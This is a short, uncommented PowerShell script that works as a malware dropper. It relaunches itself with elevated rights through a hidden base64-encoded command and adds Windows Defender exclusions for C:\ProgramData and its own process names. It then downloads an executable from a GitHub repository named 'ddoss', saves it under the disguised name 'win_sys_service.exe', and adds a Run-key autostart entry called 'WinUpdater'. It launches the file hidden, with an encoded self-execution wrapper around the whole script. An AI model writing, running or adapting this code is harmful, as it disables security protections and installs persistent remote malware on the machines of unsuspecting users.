$s = {
    if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Start-Process powershell.exe -ArgumentList "-NoP -Ex Bypass -W Hidden -Enco $([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($MyInvocation.MyCommand.Definition)))" -Verb RunAs
        exit
    }

    $p = "C:\ProgramData"
    $f = "$p\win_sys_service.exe"
    $u = "https://github.com/srap18/ddoss/raw/refs/heads/main/SystemUpdate.exe"

    Add-MpPreference -ExclusionPath $p -EA 0
    Add-MpPreference -ExclusionProcess "powershell.exe", "win_sys_service.exe" -EA 0

    Start-Sleep -s 5

    try {
        Start-BitsTransfer -Source $u -Destination $f -Priority Foreground -EA 0
        if (Test-Path $f) {
            Unblock-File -Path $f -EA 0
            Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WinUpdater' -Value "`"$f`"" -EA 0
            Start-Process -FilePath $f -WindowStyle Hidden -EA 0
        }
    } catch {
        (New-Object System.Net.WebClient).DownloadFile($u, $f)
        Start-Process $f -WindowStyle Hidden -EA 0
    }
}.ToString()

$e = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($s))
powershell.exe -NoP -W Hidden -Enco $e
